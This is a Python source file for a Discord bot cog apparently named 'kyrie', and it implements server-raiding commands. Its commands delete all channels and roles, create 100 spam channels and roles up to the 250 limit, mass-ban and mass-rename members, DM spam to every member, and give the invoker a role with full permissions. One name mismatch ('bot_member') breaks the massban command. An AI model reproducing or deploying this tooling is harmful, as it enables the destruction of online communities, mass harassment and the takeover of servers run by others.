from asyncio import gather
from config.config import Config
from utils.utils import Utils

from httpx import get
from discord import Permissions
from discord.ext import commands


class Raid(commands.Cog):
    def __init__(self, kyrie):
        self.__kyrie = kyrie
        
    @commands.command(
        name='raid',
        aliases=['r', 'crchannels', 'channels'],
        description=f'{Config.prefix}raid optional:<guild_id>',
    )
    async def raid(self, ctx, guild_id: int = None):
        if guild_id is None:
            guild = ctx.guild

        else:
            guild = self.__kyrie.get_guild(guild_id)

        response = get(Config.server_icon)
        guild_icon = response.content
        tasks = []

        if guild.id in Config.restr_guilds:
            await ctx.send('Este comando no se puede utilizar en este servidor')
            return

        await guild.edit(name=Config.server_name, icon=guild_icon)
        for _ in range(100):
            tasks.append(guild.create_text_channel(Config.channels_name))
            Utils.colorize(f'Created channel {Config.channels_name}')

        await gather(*tasks)
            
            
    @commands.command(
        name='nuke',
        aliases=['n', 'destroy', 'delchannels'],
        description=f'{Config.prefix}nuke optional:<guild_id>',
    )
    async def nuke(self, ctx, guild_id: int = None):
        if guild_id is None:
            guild = ctx.guild

        else:
            guild = self.__kyrie.get_guild(guild_id)

        tasks = []
        if guild.id in Config.restr_guilds:
            await ctx.send('Este comando no se puede utilizar en este servidor')
            return

        for channel in guild.channels:
            tasks.append(channel.delete())
            Utils.colorize(f'Deleted channel {channel}')

        await gather(*tasks)
        channel = await guild.create_text_channel(
            self.__kyrie.command_prefix)
        webhook = await channel.create_webhook(name=Config.webhook_name, avatar=await self.__kyrie.user.avatar.read())
        await webhook.send(Config.spam_message, embed=Config.spam_embed)

    @commands.command(
        name='massban',
        aliases=['banall'],
        description=f'{Config.prefix}massban optional:<guild_id>'
    )
    async def massban(self, ctx, guild_id: int = None):
        if guild_id is None:
            guild = ctx.guild

        else:
            guild = self.__kyrie.get_guild(guild_id)

        member_bot = guild.get_member(self.__kyrie.user.id)
        tasks = []
        if guild.id in Config.restr_guilds:
            await ctx.send('Este comando no se puede utilizar en este servidor')
            return

        for member in [
                member for member in guild.members
                if not member in (ctx.author, member_bot)
        ]:

            if bot_member.top_role.position > member.top_role.position:
                tasks.append(guild.ban(member))
                Utils.colorize(f'Executed {member}')

        await gather(*tasks)

    @commands.command(
        name='droles',
        aliases=['delroles'],
        description=f'{Config.prefix}droles optional:<guild_id>',
    )
    async def droles(self, ctx, guild_id: int = None):
        if guild_id is None:
            guild = ctx.guild

        else:
            guild = self.__kyrie.get_guild(guild_id)

        tasks = []
        if guild.id in Config.restr_guilds:
            await ctx.send('Este comando no se puede utilizar en este servidor')
            return

        for role in [role for role in guild.roles if role.name != 'everyone']:
            tasks.append(role.delete())
            Utils.colorize(f'Deleted role {role}')

        await gather(*tasks)

    @commands.command(
        name='bypass',
        aliases=['b'],
        description=f'{Config.prefix}bypass optional:<guild_id>',
    )
    async def bypass(self, ctx, guild_id: int = None):
        if guild_id is None:
            guild = ctx.guild
        else:
            guild = self.__kyrie.get_guild(guild_id)

        if guild.id in Config.restr_guilds:
            await ctx.send('Este comando no se puede utilizar en este servidor')
            return

        tasks = []
        for channel in guild.channels:
            tasks.append(channel.edit(name=Config.channels_name))
            Utils.colorize(f'Bypassed channel {channel}')
        
        await gather(*tasks)

    @commands.command(
        name='on',
        aliases=['start'],
        description=f'{Config.prefix}on optional:<guild_id>',
    )
    async def on(self, ctx, guild_id: int = None):
        if guild_id is None:
            guild = ctx.guild
        else:
            guild = self.__kyrie.get_guild(guild_id)

        if guild.id in Config.restr_guilds:
            await ctx.send('Este comando no se puede utilizar en este servidor')
            return

        await self.nuke(ctx, guild_id)
        await self.raid(ctx, guild_id)

    @commands.command(
        name='mkroles',
        aliases=['mkr', 'crroles'],
        description=f'{Config.prefix}mkroles optional:<guild_id>',
    )
    async def mkroles(self, ctx, guild_id: int = None):
        if guild_id is None:
            guild = ctx.guild
        else:
            guild = self.__kyrie.get_guild(guild_id)

        tasks = []
        if guild.id in Config.restr_guilds:
            await ctx.send('Este comando no se puede utilizar en este servidor')
            return

        for _ in range(250 - len(guild.roles)):
            tasks.append(guild.create_role(name=Config.roles_name))
            Utils.colorize(f'Created role {Config.roles_name}')

        await gather(*tasks)

    @commands.command(
        name='massdm',
        aliases=['dmall', 'mdall', 'md'],
        description=f'{Config.prefix}massdm optional:<guild_id>',
    )
    async def massdm(self, ctx, guild_id: int = None):
        if guild_id is None:
            guild = ctx.guild
        else:
            guild = self.__kyrie.get_guild(guild_id)

        tasks = []
        if guild.id in Config.restr_guilds:
            await ctx.send('Este comando no se puede utilizar en este servidor')
            return

        for member in [
                member for member in guild.members
                if not member in (ctx.author, self.__kyrie.user)
        ]:
            dm = await member.create_dm()
            tasks.append(dm.send(Config.spam_message, embed=Config.spam_embed))
            Utils.colorize(f'Sent message to {member}')

        await gather(*tasks)

    @commands.command(
        name='massnick',
        aliases=('nickall', 'nick'),
        description=f'{Config.prefix}massnick optional:<guild_id>',
    )
    async def massnick(self, ctx, guild_id: int = None):
        if guild_id is None:
            guild = ctx.guild
        else:
            guild = self.__kyrie.get_guild(guild_id)

        if guild.id in Config.restr_guilds:
            await ctx.send('Este comando no se puede utilizar en este servidor')
            return

        tasks = []
        member_bot = guild.get_member(self.__kyrie.user.id)
        for member in [
                member for member in guild.members
                if not member in (ctx.author, self.__kyrie.user)
        ]:
            if member_bot.top_role.position > member.top_role.position:
                tasks.append(member.edit(nick=Config.roles_name))
                Utils.colorize(f'Changed nickname of {member}')

        await gather(*tasks)

    @commands.command(
        name='admin',
        aliases=['adm', 'administrator'],
        description=f'{Config.prefix}admin optional:<guild_id>',
    )
    async def admin(self, ctx, guild_id: int = None):
        if guild_id is None:
            guild = ctx.guild
        else:
            guild = self.__kyrie.get_guild(guild_id)

        if guild.id in Config.restr_guilds:
            await ctx.send('Este comando no se puede utilizar en este servidor')
            return

        author = ctx.author
        role = await guild.create_role(name=Config.roles_name, permissions=Permissions().all())
        await author.add_roles(role)
        Utils.colorize(f'Rol admin assigned to {author}')

setup = lambda kyrie: kyrie.add_cog(Raid(kyrie))